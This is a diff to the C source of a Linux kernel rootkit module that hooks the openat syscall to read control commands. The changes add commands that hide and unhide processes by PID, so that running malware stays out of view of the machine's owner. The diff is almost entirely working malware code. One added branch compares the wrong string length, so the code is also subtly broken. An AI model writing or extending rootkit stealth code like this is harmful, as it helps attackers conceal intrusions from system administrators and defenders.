@@ -5,6 +5,7 @@
 #include <linux/device.h>
 #include <linux/slab.h>
 #include "rootkit.h"
+
 static char command[PATH_MAX];
 
 // seq_operations里存放了seq_show_fun的指针
@@ -56,6 +57,29 @@ static long my_sys_openat(const struct pt_regs *regs)
             {
                 pr_info("parse unhide port command fail.");
             }
+        }
+        else if (strncmp(command, HIDE_PID, strlen(HIDE_PID)) == 0){
+            if (sscanf(&command[strlen(HIDE_PID) + 1], "%d", &pid_num) == 1)
+            {
+                hide_pid_fn(pid_num);
+            }
+            else
+            {
+                pr_info("parse hide process command fail.");
+            }
+        }
+        else if (strncmp(command, UNHIDE_PID, strlen(UNHIDE_PID)) == 0){
+            if (sscanf(&command[strlen(UNHIDE_PID) + 1], "%d", &pid_num) == 1)
+            {
+                recover_pid_fn(pid_num);
+            }
+            else
+            {
+                pr_info("parse unhide process command fail.");
+            }
+        }
+        else if (strncmp(command, UNHIDE_ALL_PID, strlen(UNHIDE_PORT)) == 0){
+            recover_pid_all();
         }
         else
         {
